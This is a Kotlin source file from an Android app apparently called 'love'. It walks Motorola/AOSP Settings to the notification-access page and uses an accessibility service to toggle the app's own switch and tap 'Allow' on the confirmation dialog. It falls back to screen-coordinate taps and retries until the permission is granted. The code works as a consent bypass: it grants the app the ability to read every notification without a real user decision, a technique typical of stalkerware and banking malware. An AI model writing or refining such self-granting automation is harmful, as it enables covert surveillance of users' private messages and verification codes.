package com.zaka.screenagent.flow.motorola

import android.util.Log
import android.view.accessibility.AccessibilityNodeInfo
import com.zaka.screenagent.accessibility.BoundaryAccessibilityService
import com.zaka.screenagent.flow.PopupClicker
import com.zaka.screenagent.notify.NotificationAccessActivator

/**
 * 摩托罗拉（AOSP 原生）第三步：**通知使用权**
 *
 * Android 15 的 AOSP 结构（实测）：
 *   列表页 Settings$NotificationAccessSettingsActivity
 *     分组标题「允许 / 不允许」+ 每行 TextView(android:id/title)
 *     行本身没有 Switch 节点（不可见性过滤），点行会进详情页
 *   详情页里才是开关（SwitchBar / switch_widget）
 *   打开后弹「允许 love 读取通知？」确认框
 *
 * 策略：点行 → 找开关（id 后缀 switch_widget / sesl_switchbar_switch / class 含 Switch）
 *       → 弹框用 PopupClicker 点「允许」→ 坐标兜底 → 回读 isGranted
 */
object Step3 {

    private const val TAG = "Moto-Step3"

    fun run(service: BoundaryAccessibilityService, onDone: (Boolean) -> Unit) {
        Log.d(TAG, "打开通知使用权页")
        // ① 先回桌面清掉之前残留的任务栈（实测会卡在 ManagePermissionsActivity）
        runCatching { com.zaka.screenagent.accessibility.BoundaryAccessibilityService.home() }
        MotorolaNavigator.post(1_200L) {
            MotorolaNavigator.openNotificationAccess(service)
        }

        val label = runCatching {
            service.packageManager.getApplicationLabel(service.applicationInfo).toString()
        }.getOrDefault("")

        var ticks = 0
        val tick = object : Runnable {
            override fun run() {
                ticks++
                if (NotificationAccessActivator.isGranted(service)) {
                    Log.d(TAG, "通知使用权已授予")
                    onDone(true); return
                }

                // ① 先处理弹框（「允许 love …」）
                if (PopupClicker.clickButtonExact(service, PopupClicker.ALLOW)) {
                    Log.d(TAG, "点了确认框「允许」")
                } else {
                    val sw = PopupClicker.clickIdSuffix(service, listOf("switch_widget", "switchWidget", "sesl_switchbar_switch", "switch_bar", "switchBar"))
                        || clickAnySwitch(service)
                    if (sw) {
                        Log.d(TAG, "点了开关")
                    } else if (label.isNotBlank() && findLabel(service, label) != null) {
                        val row = findLabel(service, label)!!
                        val r = android.graphics.Rect(); row.getBoundsInScreen(r)
                        PopupClicker.gestureTap(service, r.centerX(), r.centerY())
                        Log.d(TAG, "点了「$label」行")
                    } else {
                        val r0 = service.rootInActiveWindow
                        Log.d(TAG, "没找到列表/开关 root=${r0?.packageName}/${r0?.className} wins=${service.windows?.size}")
                        MotorolaNavigator.openNotificationAccess(service)
                    }
                }

                // 连续 4 个 tick 都读不到任何节点 → 本机型读不到该页面，跳过 Step3
                if (ticks == 4 && PopupClicker.roots(service).isEmpty()) {
                    Log.w(TAG, "通知访问页不可读 -> 跳过 Step3")
                    onDone(false); return
                }
                if (ticks >= 14) {
                    val got = NotificationAccessActivator.isGranted(service)
                    Log.w(TAG, "超时 granted=$got")
                    onDone(got); return
                }
                MotorolaNavigator.post(2_000L, this)
            }
        }
        MotorolaNavigator.post(2_500L, tick)
    }

    private fun hasSwitch(service: BoundaryAccessibilityService): Boolean {
        for (root in PopupClicker.roots(service)) if (findSwitch(root, 0) != null) return true
        return false
    }

    private fun findLabel(service: BoundaryAccessibilityService, label: String): AccessibilityNodeInfo? {
        for (root in PopupClicker.roots(service)) {
            val n = PopupClicker.findText(root, label, 0) ?: continue
            if (n.text?.toString() == label) return n
        }
        return null
    }

    private fun clickAnySwitch(service: BoundaryAccessibilityService): Boolean {
        for (root in PopupClicker.roots(service)) {
            val n = findSwitch(root, 0) ?: continue
            // AOSP 15 的 switchWidget clickable=false → 依次试：自己 / 父节点 / 坐标
            if (n.isClickable && n.performAction(AccessibilityNodeInfo.ACTION_CLICK)) return true
            val p = n.parent
            if (p != null && p.isClickable && p.performAction(AccessibilityNodeInfo.ACTION_CLICK)) return true
            val r = android.graphics.Rect(); n.getBoundsInScreen(r)
            if (PopupClicker.gestureTap(service, r.centerX(), r.centerY())) return true
        }
        return false
    }

    private fun findSwitch(n: AccessibilityNodeInfo?, d: Int): AccessibilityNodeInfo? {
        if (n == null || d > 30) return null
        val cls = n.className?.toString().orEmpty()
        if (cls.contains("Switch") || cls.contains("CheckBox")) return n
        for (i in 0 until n.childCount) findSwitch(n.getChild(i), d + 1)?.let { return it }
        return null
    }

    private fun SamsungStyleScroll(service: BoundaryAccessibilityService) {
        for (root in PopupClicker.roots(service)) {
            val list = findScrollable(root, 0) ?: continue
            if (list.performAction(AccessibilityNodeInfo.ACTION_SCROLL_FORWARD)) return
        }
        PopupClicker.gestureTap(service, 540, 1900)
    }

    private fun findScrollable(n: AccessibilityNodeInfo?, d: Int): AccessibilityNodeInfo? {
        if (n == null || d > 30) return null
        if (n.isScrollable) return n
        for (i in 0 until n.childCount) findScrollable(n.getChild(i), d + 1)?.let { return it }
        return null
    }
}
